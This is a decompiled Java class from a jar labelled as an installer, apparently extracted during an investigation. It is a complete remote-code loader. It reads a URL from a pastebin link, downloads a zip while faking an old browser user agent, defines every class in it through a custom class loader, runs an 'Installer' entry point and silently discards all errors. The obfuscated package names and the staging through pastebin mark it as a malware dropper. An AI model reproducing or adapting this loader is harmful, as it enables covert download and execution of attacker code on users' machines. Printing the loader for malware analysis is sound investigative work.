/*    */ package idasido.adldaosd.wpiw.install;
/*    */ import java.io.BufferedReader;
/*    */ import java.io.ByteArrayOutputStream;
/*    */ import java.io.InputStream;
/*    */ import java.io.InputStreamReader;
/*    */ import java.net.HttpURLConnection;
/*    */ import java.net.URL;
/*    */ import java.util.HashMap;
/*    */ import java.util.Map;
/*    */ import java.util.zip.ZipEntry;
/*    */ import java.util.zip.ZipInputStream;
/*    */ 
/*    */ public class Bootstrap extends ClassLoader {
/*    */   public static void main() {
/*    */     try {
/* 16 */       Bootstrap loader = new Bootstrap();
/*    */       
/* 18 */       URL pastebin = new URL("https://pastebin.com/raw/tBwfWsTm");
/* 19 */       BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
/* 20 */       String fileURL = reader.readLine();
/* 21 */       URL url = new URL(fileURL);
/*    */       
/* 23 */       HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
/* 24 */       httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
/* 25 */       InputStream inputStream = httpURLConnection.getInputStream();
/*    */       
/* 27 */       ZipInputStream zipInputStream = new ZipInputStream(inputStream);
/*    */       
/*    */       ZipEntry zipEntry;
/* 30 */       while ((zipEntry = zipInputStream.getNextEntry()) != null) {
/* 31 */         String name = zipEntry.getName();
/*    */         
/* 33 */         if (!name.endsWith(".class"))
/*    */           continue; 
/* 35 */         name = name.substring(0, name.length() - 6);
/* 36 */         name = name.replace('/', '.');
/*    */         
/* 38 */         ByteArrayOutputStream streamBuilder = new ByteArrayOutputStream();
/*    */         
/* 40 */         byte[] tempBuffer = new byte[16384]; int bytesRead;
/* 41 */         for (; (bytesRead = zipInputStream.read(tempBuffer)) != -1; streamBuilder.write(tempBuffer, 0, bytesRead));
/*    */         
/* 43 */         loader.classes.put(name, streamBuilder.toByteArray());
/*    */       } 
/* 45 */       loader.findClass("idasido.adldaosd.wpiw.install.Installer").getMethod("main", new Class[0]).invoke(null, new Object[0]);
/*    */     }
/* 47 */     catch (Exception exception) {}
/*    */   }
/*    */   
/* 50 */   public Map<String, byte[]> classes = (Map)new HashMap<>();
/*    */ 
/*    */   
/*    */   protected Class<?> findClass(String s) throws ClassNotFoundException {
/* 54 */     Class<?> clazz = null;
/*    */     try {
/* 56 */       clazz = super.findClass(s);
/*    */     }
/* 58 */     catch (Exception exception) {}
/*    */     
/*    */     try {
/* 61 */       if (this.classes.containsKey(s)) {
/* 62 */         clazz = defineClass(s, this.classes.get(s), 0, ((byte[])this.classes.get(s)).length);
/*    */       }
/* 64 */     } catch (Throwable throwable) {}
/*    */     
/* 66 */     return clazz;
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-installer.jar!\idasido\adldaosd\wpiw\install\Bootstrap.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */